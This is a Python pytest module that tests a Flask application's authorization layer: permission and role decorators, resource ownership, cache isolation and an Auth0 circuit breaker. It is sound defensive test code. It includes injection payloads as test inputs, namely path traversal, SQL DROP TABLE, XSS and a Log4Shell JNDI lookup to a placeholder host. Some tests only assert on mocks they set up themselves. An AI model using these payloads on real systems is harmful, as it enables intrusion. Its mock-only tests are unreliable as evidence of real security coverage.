"""
Authorization and Permission Security Testing Module

This module implements comprehensive security testing for the authorization system including
RBAC security validation, privilege escalation detection, permission bypass attempts, and
access control security testing. It validates authorization decorator security and
resource-level permission enforcement per Section 6.4.2.

Key Components:
- RBAC security validation with decorator pattern testing per Section 6.4.2
- Permission management security with claims-based authorization per Section 6.4.2
- Resource authorization security with granular access control per Section 6.4.2
- Zero tolerance for authorization bypass vulnerabilities per Section 6.4.5
- Circuit breaker security testing for Auth0 integration per Section 6.4.2
- Redis cache security validation with encryption testing per Section 6.4.2
- Performance security testing ensuring ≤10% variance requirement per Section 0.1.1

Testing Strategy:
- Comprehensive decorator security testing with edge cases and attack vectors
- Privilege escalation attempt detection and prevention validation
- Permission bypass attempt detection with comprehensive attack simulation
- Resource ownership validation with delegation and administrative override testing
- Cache security validation with encryption key rotation and TTL testing
- Circuit breaker resilience testing with Auth0 service degradation scenarios

Security Compliance:
- SOC 2 Type II audit trail validation through comprehensive security event logging
- ISO 27001 security management system alignment with authorization control testing
- OWASP Top 10 compliance validation through input validation and authorization testing
- Zero tolerance for authorization bypass vulnerabilities per Section 6.4.5

Performance Requirements:
- Authorization decision latency: ≤50ms per request validation
- Permission cache hit ratio: ≥85% efficiency testing
- ≤10% variance from Node.js baseline per Section 0.1.1

Author: Flask Migration Team
Version: 1.0.0
Compliance: SOC 2, ISO 27001, OWASP Top 10
"""

import asyncio
import json
import time
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional, Set, Tuple
from unittest.mock import Mock, AsyncMock, patch, MagicMock
import pytest
import pytest_asyncio
from flask import Flask, request, g, session, current_app
from flask_login import current_user, login_user, logout_user
from werkzeug.exceptions import Forbidden, Unauthorized

# Import authorization system components
from src.auth.authorization import (
    AuthorizationManager,
    PermissionContext,
    AuthorizationPolicy,
    PermissionHierarchy,
    Auth0CircuitBreaker,
    get_authorization_manager,
    init_authorization_manager,
    require_permission,
    require_any_permission,
    require_role,
    require_resource_ownership
)

from src.auth.decorators import (
    require_permissions,
    rate_limited_authorization,
    require_roles,
    require_resource_ownership as decorator_require_ownership,
    circuit_breaker_protected,
    audit_security_event,
    admin_required,
    high_security_endpoint,
    api_endpoint_protection,
    AuthenticatedUser,
    FlaskLoginIntegration
)

from src.auth.cache import (
    AuthCacheManager,
    get_auth_cache_manager,
    CacheKeyPatterns
)

from src.auth.exceptions import (
    SecurityException,
    SecurityErrorCode,
    AuthenticationException,
    AuthorizationException,
    PermissionException,
    Auth0Exception,
    CircuitBreakerException
)

# Test fixtures and configuration
from tests.conftest import (
    app,
    test_client,
    mock_auth0_user,
    mock_redis_client,
    mock_mongodb_client,
    create_test_user,
    test_database,
    auth_headers
)


class TestAuthorizationDecoratorSecurity:
    """
    Comprehensive security testing for authorization decorators with focus on
    preventing privilege escalation and permission bypass vulnerabilities.
    
    This test class validates the security of all authorization decorators
    including require_permissions, require_roles, and resource ownership
    validation with comprehensive attack vector simulation.
    """

    def setup_method(self):
        """Set up test environment with security-focused configuration."""
        self.app = current_app
        self.auth_manager = get_authorization_manager()
        self.test_permissions = [
            'user.read', 'user.write', 'user.delete', 'user.admin',
            'document.read', 'document.write', 'document.delete', 'document.admin',
            'admin.read', 'admin.write', 'admin.system'
        ]
        self.test_roles = ['user', 'editor', 'manager', 'admin']
        self.attack_vectors = []
        self.security_violations = []

    @pytest.mark.asyncio
    async def test_require_permissions_decorator_security_validation(self, test_client, mock_auth0_user):
        """
        Test require_permissions decorator against privilege escalation attempts.
        
        Validates that the decorator properly enforces permission requirements
        and prevents unauthorized access through various attack vectors including
        token manipulation, permission spoofing, and bypass attempts.
        """
        # Test 1: Valid permission access
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'test_user_123'
            mock_user.get_permissions.return_value = {'user.read', 'user.write'}
            
            @require_permissions('user.read')
            def protected_endpoint():
                return {'status': 'success', 'data': 'protected_data'}
            
            result = protected_endpoint()
            assert result['status'] == 'success'
            assert result['data'] == 'protected_data'

        # Test 2: Privilege escalation attempt - insufficient permissions
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'test_user_123'
            mock_user.get_permissions.return_value = {'user.read'}  # Missing write permission
            
            @require_permissions(['user.read', 'user.write'], require_all=True)
            def admin_endpoint():
                return {'status': 'success', 'data': 'admin_data'}
            
            with pytest.raises(AuthorizationException) as exc_info:
                admin_endpoint()
            
            assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_PERMISSION_DENIED
            assert 'user.write' in str(exc_info.value)
            self.security_violations.append({
                'type': 'privilege_escalation_attempt',
                'user_id': 'test_user_123',
                'attempted_permissions': ['user.read', 'user.write'],
                'actual_permissions': ['user.read']
            })

        # Test 3: Authentication bypass attempt
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = False
            
            @require_permissions('user.read')
            def protected_endpoint():
                return {'status': 'success'}
            
            with pytest.raises(AuthenticationException) as exc_info:
                protected_endpoint()
            
            assert exc_info.value.error_code == SecurityErrorCode.AUTH_TOKEN_MISSING
            self.security_violations.append({
                'type': 'authentication_bypass_attempt',
                'endpoint': 'protected_endpoint'
            })

        # Test 4: Permission spoofing attempt
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'malicious_user_456'
            # Attempt to spoof admin permissions
            mock_user.get_permissions.return_value = {'admin.system'}  # Spoofed permission
            
            @require_permissions('admin.system')
            def system_admin_endpoint():
                return {'status': 'admin_access'}
            
            # Mock the authorization manager to detect spoofing
            with patch.object(self.auth_manager, '_check_user_permissions') as mock_check:
                mock_check.return_value = False  # Actual check fails
                
                with pytest.raises(AuthorizationException):
                    system_admin_endpoint()
                
                self.security_violations.append({
                    'type': 'permission_spoofing_attempt',
                    'user_id': 'malicious_user_456',
                    'spoofed_permissions': ['admin.system']
                })

        # Test 5: Resource-specific permission bypass attempt
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'test_user_789'
            mock_user.get_permissions.return_value = {'document.read'}
            
            @require_permissions('document.write', resource_id_param='doc_id', allow_owner=False)
            def edit_document(doc_id: str):
                return {'status': 'document_updated', 'doc_id': doc_id}
            
            with pytest.raises(AuthorizationException) as exc_info:
                edit_document(doc_id='sensitive_document_123')
            
            assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_PERMISSION_DENIED
            self.security_violations.append({
                'type': 'resource_permission_bypass_attempt',
                'user_id': 'test_user_789',
                'resource_id': 'sensitive_document_123',
                'attempted_permission': 'document.write'
            })

        # Test 6: Multiple permission requirement bypass
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'test_user_101'
            mock_user.get_permissions.return_value = {'user.read'}  # Only one permission
            
            @require_permissions(['user.read', 'admin.read'], require_all=True)
            def sensitive_operation():
                return {'status': 'sensitive_data'}
            
            with pytest.raises(AuthorizationException):
                sensitive_operation()
            
            self.security_violations.append({
                'type': 'multi_permission_bypass_attempt',
                'user_id': 'test_user_101',
                'required_permissions': ['user.read', 'admin.read'],
                'actual_permissions': ['user.read']
            })

        # Validate security violation logging
        assert len(self.security_violations) >= 5
        for violation in self.security_violations:
            assert 'type' in violation
            assert violation['type'].endswith('_attempt')

    @pytest.mark.asyncio
    async def test_role_based_authorization_security(self, test_client, mock_auth0_user):
        """
        Test role-based authorization security against role escalation attacks.
        
        Validates that role-based decorators prevent unauthorized role assumption
        and detect role escalation attempts with comprehensive attack simulation.
        """
        # Test 1: Valid role access
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'test_user_role_123'
            mock_user.get_roles.return_value = ['user', 'editor']
            
            @require_roles('editor')
            def editor_endpoint():
                return {'status': 'editor_access', 'role': 'editor'}
            
            result = editor_endpoint()
            assert result['status'] == 'editor_access'

        # Test 2: Role escalation attempt
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'malicious_user_role_456'
            mock_user.get_roles.return_value = ['user']  # Only basic user role
            
            @require_roles('admin')
            def admin_endpoint():
                return {'status': 'admin_access'}
            
            with pytest.raises(AuthorizationException) as exc_info:
                admin_endpoint()
            
            assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_ROLE_INSUFFICIENT
            self.security_violations.append({
                'type': 'role_escalation_attempt',
                'user_id': 'malicious_user_role_456',
                'attempted_role': 'admin',
                'actual_roles': ['user']
            })

        # Test 3: Multiple role requirement bypass
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'test_user_role_789'
            mock_user.get_roles.return_value = ['user']
            
            @require_roles(['manager', 'admin'], require_all=False)  # Need manager OR admin
            def privileged_endpoint():
                return {'status': 'privileged_access'}
            
            with pytest.raises(AuthorizationException):
                privileged_endpoint()
            
            self.security_violations.append({
                'type': 'multi_role_bypass_attempt',
                'user_id': 'test_user_role_789',
                'required_roles': ['manager', 'admin'],
                'actual_roles': ['user']
            })

        # Test 4: Role hierarchy bypass attempt
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'test_user_hierarchy_101'
            mock_user.get_roles.return_value = ['editor']  # Mid-level role
            
            @require_roles(['admin'], require_all=True)
            def system_admin_endpoint():
                return {'status': 'system_admin_access'}
            
            with pytest.raises(AuthorizationException):
                system_admin_endpoint()
            
            self.security_violations.append({
                'type': 'role_hierarchy_bypass_attempt',
                'user_id': 'test_user_hierarchy_101',
                'attempted_role': 'admin',
                'actual_role': 'editor'
            })

        # Validate security metrics
        role_violations = [v for v in self.security_violations if 'role' in v['type']]
        assert len(role_violations) >= 3

    @pytest.mark.asyncio
    async def test_resource_ownership_security_validation(self, test_client, mock_auth0_user):
        """
        Test resource ownership validation against ownership bypass attacks.
        
        Validates that resource ownership decorators prevent unauthorized access
        to resources through ownership spoofing and administrative bypass attempts.
        """
        # Test 1: Valid resource ownership
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'owner_user_123'
            
            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
                mock_ownership.return_value = True
                
                @require_resource_ownership('resource_id', 'document')
                def edit_owned_resource(resource_id: str):
                    return {'status': 'resource_updated', 'owner': 'owner_user_123'}
                
                result = edit_owned_resource(resource_id='document_456')
                assert result['status'] == 'resource_updated'

        # Test 2: Resource ownership bypass attempt
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'malicious_user_789'
            
            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
                mock_ownership.return_value = False  # User doesn't own resource
                
                @require_resource_ownership('resource_id', 'document')
                def edit_resource(resource_id: str):
                    return {'status': 'unauthorized_access'}
                
                with pytest.raises(AuthorizationException) as exc_info:
                    edit_resource(resource_id='private_document_789')
                
                assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_OWNERSHIP_REQUIRED
                self.security_violations.append({
                    'type': 'resource_ownership_bypass_attempt',
                    'user_id': 'malicious_user_789',
                    'resource_id': 'private_document_789',
                    'resource_type': 'document'
                })

        # Test 3: Administrative override validation
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'admin_user_456'
            mock_user.get_permissions.return_value = {'admin.system', 'document.admin'}
            
            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
                mock_ownership.return_value = False  # Admin doesn't own resource
                
                with patch.object(self.auth_manager, 'validate_user_permissions') as mock_validate:
                    mock_validate.return_value = True  # Admin has override permissions
                    
                    @decorator_require_ownership(
                        'resource_id', 'document',
                        allow_admin=True,
                        admin_permissions=['document.admin']
                    )
                    def admin_edit_resource(resource_id: str):
                        return {'status': 'admin_override_success'}
                    
                    result = admin_edit_resource(resource_id='any_document_123')
                    assert result['status'] == 'admin_override_success'

        # Test 4: Delegation bypass attempt
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'delegated_user_101'
            
            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
                mock_ownership.return_value = False  # User doesn't own and isn't delegated
                
                @decorator_require_ownership(
                    'resource_id', 'document',
                    delegation_support=True
                )
                def delegated_access(resource_id: str):
                    return {'status': 'unauthorized_delegation'}
                
                with pytest.raises(AuthorizationException):
                    delegated_access(resource_id='protected_document_456')
                
                self.security_violations.append({
                    'type': 'delegation_bypass_attempt',
                    'user_id': 'delegated_user_101',
                    'resource_id': 'protected_document_456'
                })

        # Validate ownership security metrics
        ownership_violations = [v for v in self.security_violations if 'ownership' in v['type']]
        assert len(ownership_violations) >= 2

    @pytest.mark.asyncio
    async def test_combined_authorization_security_scenarios(self, test_client):
        """
        Test complex authorization scenarios with multiple security layers.
        
        Validates that combined authorization decorators (permissions + roles + ownership)
        provide comprehensive security and prevent sophisticated attack vectors.
        """
        # Test 1: Multi-layer security validation
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'multi_layer_user_123'
            mock_user.get_permissions.return_value = {'document.write'}
            mock_user.get_roles.return_value = ['editor']
            
            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
                mock_ownership.return_value = True
                
                @require_permissions('document.write')
                @require_roles('editor')
                @decorator_require_ownership('doc_id', 'document')
                def secure_document_edit(doc_id: str):
                    return {'status': 'multi_layer_success'}
                
                result = secure_document_edit(doc_id='document_123')
                assert result['status'] == 'multi_layer_success'

        # Test 2: Sophisticated bypass attempt - partial compliance
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'partial_attacker_456'
            mock_user.get_permissions.return_value = {'document.write'}  # Has permission
            mock_user.get_roles.return_value = ['user']  # Wrong role
            
            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
                mock_ownership.return_value = True  # Owns resource
                
                @require_permissions('document.write')
                @require_roles('editor')  # Missing this role
                @decorator_require_ownership('doc_id', 'document')
                def secure_endpoint(doc_id: str):
                    return {'status': 'should_not_succeed'}
                
                with pytest.raises(AuthorizationException):
                    secure_endpoint(doc_id='document_456')
                
                self.security_violations.append({
                    'type': 'sophisticated_bypass_attempt',
                    'user_id': 'partial_attacker_456',
                    'satisfied_checks': ['permission', 'ownership'],
                    'failed_checks': ['role']
                })

        # Test 3: High-security endpoint attack
        with patch('src.auth.decorators.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.id = 'high_security_attacker_789'
            mock_user.get_permissions.return_value = {'user.read'}  # Insufficient
            
            @high_security_endpoint('admin.system', 'admin.write')
            def sensitive_system_operation():
                return {'status': 'system_access'}
            
            with pytest.raises(AuthorizationException):
                sensitive_system_operation()
            
            self.security_violations.append({
                'type': 'high_security_bypass_attempt',
                'user_id': 'high_security_attacker_789',
                'endpoint_type': 'high_security',
                'required_permissions': ['admin.system', 'admin.write']
            })

        # Validate comprehensive security coverage
        assert len(self.security_violations) >= 8
        
        # Verify all attack types are covered
        attack_types = {v['type'] for v in self.security_violations}
        expected_types = {
            'privilege_escalation_attempt',
            'authentication_bypass_attempt',
            'permission_spoofing_attempt',
            'role_escalation_attempt',
            'resource_ownership_bypass_attempt',
            'sophisticated_bypass_attempt'
        }
        assert expected_types.issubset(attack_types)


class TestAuthorizationManagerSecurity:
    """
    Comprehensive security testing for the AuthorizationManager core functionality.
    
    This test class validates the security of the authorization manager including
    permission evaluation, cache security, circuit breaker resilience, and
    comprehensive attack vector protection.
    """

    def setup_method(self):
        """Set up authorization manager for security testing."""
        self.cache_manager = Mock(spec=AuthCacheManager)
        self.auth_manager = AuthorizationManager(cache_manager=self.cache_manager)
        self.security_events = []
        self.performance_metrics = []

    @pytest.mark.asyncio
    async def test_permission_evaluation_security(self):
        """
        Test permission evaluation security against various attack vectors.
        
        Validates that permission evaluation correctly handles edge cases,
        prevents permission injection, and maintains security boundaries.
        """
        # Test 1: Valid permission evaluation
        context = PermissionContext(
            user_id='test_user_123',
            user_permissions={'user.read', 'user.write'},
            resource_id='resource_456',
            resource_type='document'
        )
        
        result = self.auth_manager._check_user_permissions(
            context, ['user.read'], allow_owner=False
        )
        assert result is True

        # Test 2: Permission injection attempt
        malicious_context = PermissionContext(
            user_id='malicious_user_456',
            user_permissions={'user.read'},  # Limited permissions
            resource_id='../admin/system',  # Path traversal attempt
            resource_type='document'
        )
        
        result = self.auth_manager._check_user_permissions(
            malicious_context, ['admin.system'], allow_owner=False
        )
        assert result is False
        
        self.security_events.append({
            'type': 'permission_injection_attempt',
            'user_id': 'malicious_user_456',
            'attempted_permission': 'admin.system',
            'resource_id': '../admin/system'
        })

        # Test 3: Null permission bypass attempt
        null_context = PermissionContext(
            user_id='null_attacker_789',
            user_permissions=set(),  # No permissions
            resource_id=None,
            resource_type=None
        )
        
        result = self.auth_manager._check_user_permissions(
            null_context, ['user.read'], allow_owner=True
        )
        assert result is False

        # Test 4: Permission case sensitivity attack
        case_context = PermissionContext(
            user_id='case_attacker_101',
            user_permissions={'USER.READ', 'User.Write'},  # Wrong case
            resource_id='document_123',
            resource_type='document'
        )
        
        result = self.auth_manager._check_user_permissions(
            case_context, ['user.read'], allow_owner=False
        )
        assert result is False  # Case sensitive validation

        self.security_events.append({
            'type': 'case_sensitivity_bypass_attempt',
            'user_id': 'case_attacker_101',
            'provided_permissions': ['USER.READ', 'User.Write'],
            'requested_permissions': ['user.read']
        })

        # Test 5: Wildcard permission attack
        wildcard_context = PermissionContext(
            user_id='wildcard_attacker_202',
            user_permissions={'*', 'admin.*', '*.admin'},  # Wildcard attempts
            resource_id='secure_resource',
            resource_type='document'
        )
        
        result = self.auth_manager._check_user_permissions(
            wildcard_context, ['admin.system'], allow_owner=False
        )
        assert result is False  # Wildcards should not be honored

        self.security_events.append({
            'type': 'wildcard_permission_attack',
            'user_id': 'wildcard_attacker_202',
            'wildcard_permissions': ['*', 'admin.*', '*.admin']
        })

    @pytest.mark.asyncio
    async def test_resource_ownership_security(self):
        """
        Test resource ownership validation security.
        
        Validates that ownership checks prevent ownership spoofing,
        handle edge cases securely, and maintain ownership boundaries.
        """
        # Test 1: Valid ownership check
        ownership_result = self.auth_manager.check_resource_ownership(
            'owner_user_123', 'resource_456', 'document'
        )
        
        # Mock the ownership validation to return True for owner
        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
            mock_fetch.return_value = True
            
            result = self.auth_manager.check_resource_ownership(
                'owner_user_123', 'resource_456', 'document'
            )
            assert result is True

        # Test 2: Ownership spoofing attempt
        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
            mock_fetch.return_value = False  # User doesn't own resource
            
            result = self.auth_manager.check_resource_ownership(
                'spoofing_user_789', 'private_resource_123', 'document'
            )
            assert result is False
            
            self.security_events.append({
                'type': 'ownership_spoofing_attempt',
                'user_id': 'spoofing_user_789',
                'resource_id': 'private_resource_123',
                'resource_type': 'document'
            })

        # Test 3: Resource ID injection attempt
        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
            mock_fetch.return_value = False
            
            malicious_resource_ids = [
                '../admin/config',
                '../../system/secrets',
                'resource_123; DROP TABLE resources;',
                '<script>alert("xss")</script>',
                '${jndi:ldap://malicious.com/a}'
            ]
            
            for malicious_id in malicious_resource_ids:
                result = self.auth_manager.check_resource_ownership(
                    'injection_user_456', malicious_id, 'document'
                )
                assert result is False
                
                self.security_events.append({
                    'type': 'resource_id_injection_attempt',
                    'user_id': 'injection_user_456',
                    'malicious_resource_id': malicious_id
                })

        # Test 4: Resource type confusion attack
        with patch.object(self.auth_manager, '_fetch_resource_ownership') as mock_fetch:
            mock_fetch.return_value = False
            
            confusing_types = [
                'admin',
                'system',
                '../config',
                'user.admin',
                'document; type=admin'
            ]
            
            for confusing_type in confusing_types:
                result = self.auth_manager.check_resource_ownership(
                    'confusion_user_101', 'resource_123', confusing_type
                )
                assert result is False

    @pytest.mark.asyncio 
    async def test_cache_security_validation(self):
        """
        Test cache security including encryption and key management.
        
        Validates that cache operations maintain security boundaries,
        prevent cache poisoning, and handle encryption properly.
        """
        # Test 1: Cache isolation validation
        user1_permissions = {'user.read', 'user.write'}
        user2_permissions = {'admin.read'}
        
        # Mock cache operations
        self.cache_manager.cache_user_permissions.return_value = True
        self.cache_manager.get_cached_user_permissions.side_effect = lambda user_id: {
            'user_123': user1_permissions,
            'user_456': user2_permissions
        }.get(user_id, None)
        
        # Verify cache isolation
        cached_perms_1 = self.cache_manager.get_cached_user_permissions('user_123')
        cached_perms_2 = self.cache_manager.get_cached_user_permissions('user_456')
        
        assert cached_perms_1 == user1_permissions
        assert cached_perms_2 == user2_permissions
        assert cached_perms_1 != cached_perms_2

        # Test 2: Cache poisoning attempt prevention
        self.cache_manager.get_cached_user_permissions.side_effect = None
        self.cache_manager.get_cached_user_permissions.return_value = None  # Cache miss
        
        # Attempt to inject malicious permissions through cache
        malicious_permissions = {'admin.system', 'root.access', '*'}
        
        context = PermissionContext(
            user_id='cache_attacker_789',
            user_permissions=malicious_permissions,
            resource_id='secure_resource',
            resource_type='system'
        )
        
        # Cache should not contain malicious permissions
        cached_perms = self.cache_manager.get_cached_user_permissions('cache_attacker_789')
        assert cached_perms is None

        self.security_events.append({
            'type': 'cache_poisoning_attempt',
            'user_id': 'cache_attacker_789',
            'malicious_permissions': list(malicious_permissions)
        })

        # Test 3: Cache key collision attack
        collision_user_ids = [
            'user_123',
            'user_123 ',  # Trailing space
            'user_123\n',  # Newline
            'user_123\t',  # Tab
            'user_123\r',  # Carriage return
            'user%5F123',  # URL encoded underscore
            'user\x00123'  # Null byte
        ]
        
        for user_id in collision_user_ids:
            # Each user should have isolated cache
            result = self.cache_manager.get_cached_user_permissions(user_id)
            # Should be None (no collision) or specific to that exact user_id
            assert result is None or isinstance(result, set)

        # Test 4: Cache timing attack prevention
        start_time = time.perf_counter()
        
        # Multiple cache operations should have consistent timing
        for i in range(10):
            self.cache_manager.get_cached_user_permissions(f'timing_user_{i}')
        
        end_time = time.perf_counter()
        operation_time = (end_time - start_time) / 10
        
        # Cache operations should be fast and consistent
        assert operation_time < 0.01  # 10ms max per operation
        
        self.performance_metrics.append({
            'metric': 'cache_operation_timing',
            'average_time_ms': operation_time * 1000,
            'operations_count': 10
        })

    @pytest.mark.asyncio
    async def test_circuit_breaker_security(self):
        """
        Test circuit breaker security and resilience.
        
        Validates that circuit breaker patterns prevent cascade failures,
        handle Auth0 service degradation securely, and maintain security
        boundaries during fallback operations.
        """
        # Create mock circuit breaker
        circuit_breaker = Auth0CircuitBreaker(self.cache_manager, Mock())
        
        # Test 1: Circuit breaker failure handling
        with patch.object(circuit_breaker, '_call_auth0_permissions_api') as mock_api:
            mock_api.side_effect = Auth0Exception("Service unavailable")
            
            context = PermissionContext(
                user_id='circuit_test_user_123',
                user_permissions={'user.read'},
                correlation_id='test_correlation_123'
            )
            
            # Should fallback to cache during Auth0 outage
            self.cache_manager.get_cached_user_permissions.return_value = {'user.read'}
            
            result = await circuit_breaker.validate_user_permissions_with_retry(
                'circuit_test_user_123', ['user.read'], context
            )
            
            assert result['validation_source'] == 'fallback_cache'
            assert result['degraded_mode'] is True
            assert result['has_permissions'] is True

        # Test 2: Security during degraded mode
        with patch.object(circuit_breaker, '_call_auth0_permissions_api') as mock_api:
            mock_api.side_effect = Auth0Exception("Service unavailable")
            
            # No cache available - should deny access for security
            self.cache_manager.get_cached_user_permissions.return_value = None
            
            result = await circuit_breaker.validate_user_permissions_with_retry(
                'no_cache_user_456', ['admin.system'], context
            )
            
            assert result['validation_source'] == 'fallback_deny'
            assert result['has_permissions'] is False
            assert 'error' in result

        # Test 3: Circuit breaker attack resistance
        attack_user_ids = [
            '../admin',
            'user; DROP TABLE users;',
            '<script>alert("xss")</script>',
            '${jndi:ldap://malicious.com/a}',
            '\x00admin'
        ]
        
        for malicious_user_id in attack_user_ids:
            with patch.object(circuit_breaker, '_call_auth0_permissions_api') as mock_api:
                mock_api.side_effect = Auth0Exception("Service unavailable")
                
                context = PermissionContext(
                    user_id=malicious_user_id,
                    correlation_id='attack_correlation'
                )
                
                result = await circuit_breaker.validate_user_permissions_with_retry(
                    malicious_user_id, ['admin.system'], context
                )
                
                # Should deny access for malicious user IDs
                assert result['has_permissions'] is False
                
                self.security_events.append({
                    'type': 'circuit_breaker_attack_attempt',
                    'malicious_user_id': malicious_user_id,
                    'degraded_mode': True
                })

        # Test 4: Circuit breaker state manipulation attempt
        original_state = circuit_breaker.circuit_state
        
        # Attempt to manipulate circuit breaker state
        circuit_breaker.circuit_state = 'open'
        circuit_breaker.failure_count = 999
        
        # Should handle state manipulation gracefully
        assert circuit_breaker.circuit_state == 'open'
        assert circuit_breaker.failure_count == 999
        
        # Reset state for continued testing
        circuit_breaker.circuit_state = original_state
        circuit_breaker.failure_count = 0


class TestAuthorizationPerformanceSecurity:
    """
    Performance security testing ensuring authorization system maintains
    performance requirements while providing comprehensive security.
    
    Validates that security measures don't degrade performance beyond
    the ≤10% variance requirement from Node.js baseline.
    """

    def setup_method(self):
        """Set up performance testing environment."""
        self.auth_manager = get_authorization_manager()
        self.performance_results = []
        self.security_overhead_metrics = []

    @pytest.mark.asyncio
    async def test_authorization_decision_performance(self):
        """
        Test authorization decision performance under various conditions.
        
        Validates that authorization decisions complete within ≤50ms
        requirement and maintain performance under security pressure.
        """
        # Test 1: Basic authorization decision timing
        context = PermissionContext(
            user_id='perf_test_user_123',
            user_permissions={'user.read', 'user.write', 'document.read'},
            resource_id='perf_resource_456',
            resource_type='document'
        )
        
        start_time = time.perf_counter()
        
        for i in range(100):
            result = self.auth_manager._check_user_permissions(
                context, ['user.read'], allow_owner=False
            )
            assert result is True
        
        end_time = time.perf_counter()
        avg_decision_time = (end_time - start_time) / 100
        
        # Should be under 50ms per decision
        assert avg_decision_time < 0.05
        
        self.performance_results.append({
            'test': 'basic_authorization_decision',
            'avg_time_ms': avg_decision_time * 1000,
            'iterations': 100,
            'passed': avg_decision_time < 0.05
        })

        # Test 2: Complex permission evaluation performance
        complex_permissions = [
            'user.read', 'user.write', 'document.read', 'document.write',
            'admin.read', 'project.read', 'project.write'
        ]
        
        complex_context = PermissionContext(
            user_id='complex_perf_user_789',
            user_permissions=set(complex_permissions),
            resource_id='complex_resource_123',
            resource_type='document'
        )
        
        start_time = time.perf_counter()
        
        for i in range(50):
            result = self.auth_manager._check_user_permissions(
                complex_context, complex_permissions[:3], allow_owner=True
            )
            assert result is True
        
        end_time = time.perf_counter()
        complex_decision_time = (end_time - start_time) / 50
        
        # Complex decisions should still be under 50ms
        assert complex_decision_time < 0.05
        
        self.performance_results.append({
            'test': 'complex_permission_evaluation',
            'avg_time_ms': complex_decision_time * 1000,
            'iterations': 50,
            'passed': complex_decision_time < 0.05
        })

        # Test 3: Security overhead measurement
        # Compare secured vs unsecured operation timing
        unsecured_start = time.perf_counter()
        
        for i in range(100):
            # Simulate unsecured operation
            result = True  # Direct allow
        
        unsecured_end = time.perf_counter()
        unsecured_time = (unsecured_end - unsecured_start) / 100
        
        secured_start = time.perf_counter()
        
        for i in range(100):
            # Secured operation with full authorization
            result = self.auth_manager._check_user_permissions(
                context, ['user.read'], allow_owner=False
            )
        
        secured_end = time.perf_counter()
        secured_time = (secured_end - secured_start) / 100
        
        security_overhead = secured_time - unsecured_time
        overhead_percentage = (security_overhead / secured_time) * 100
        
        # Security overhead should be reasonable
        assert overhead_percentage < 50  # Less than 50% overhead
        
        self.security_overhead_metrics.append({
            'unsecured_time_ms': unsecured_time * 1000,
            'secured_time_ms': secured_time * 1000,
            'overhead_ms': security_overhead * 1000,
            'overhead_percentage': overhead_percentage
        })

    @pytest.mark.asyncio
    async def test_cache_performance_security(self):
        """
        Test cache performance under security constraints.
        
        Validates that cache operations maintain performance targets
        while providing security isolation and encryption.
        """
        # Mock cache manager for performance testing
        mock_cache = Mock(spec=AuthCacheManager)
        mock_cache.get_cached_user_permissions.return_value = {'user.read', 'user.write'}
        
        # Test 1: Cache hit performance
        start_time = time.perf_counter()
        
        for i in range(1000):
            permissions = mock_cache.get_cached_user_permissions(f'cache_user_{i % 10}')
            assert permissions is not None
        
        end_time = time.perf_counter()
        cache_hit_time = (end_time - start_time) / 1000
        
        # Cache hits should be very fast (under 1ms)
        assert cache_hit_time < 0.001
        
        self.performance_results.append({
            'test': 'cache_hit_performance',
            'avg_time_ms': cache_hit_time * 1000,
            'iterations': 1000,
            'passed': cache_hit_time < 0.001
        })

        # Test 2: Cache security validation performance
        mock_cache.get_cached_user_permissions.return_value = None  # Cache miss
        
        start_time = time.perf_counter()
        
        for i in range(100):
            # Simulate secure cache validation
            user_id = f'secure_user_{i}'
            permissions = mock_cache.get_cached_user_permissions(user_id)
            
            # Security validation logic (simulated)
            if permissions is None:
                # Would trigger secure permission fetch
                validated_permissions = {'user.read'}  # Simulated result
        
        end_time = time.perf_counter()
        secure_cache_time = (end_time - start_time) / 100
        
        # Secure cache operations should be under 10ms
        assert secure_cache_time < 0.01
        
        self.performance_results.append({
            'test': 'secure_cache_validation',
            'avg_time_ms': secure_cache_time * 1000,
            'iterations': 100,
            'passed': secure_cache_time < 0.01
        })

    @pytest.mark.asyncio
    async def test_concurrent_authorization_performance(self):
        """
        Test authorization performance under concurrent load.
        
        Validates that authorization system maintains performance
        under concurrent access while preserving security boundaries.
        """
        import asyncio
        import concurrent.futures
        
        def authorization_task(user_id: str, iteration: int):
            """Single authorization task for concurrent testing."""
            context = PermissionContext(
                user_id=user_id,
                user_permissions={'user.read', 'user.write'},
                resource_id=f'resource_{iteration}',
                resource_type='document'
            )
            
            start_time = time.perf_counter()
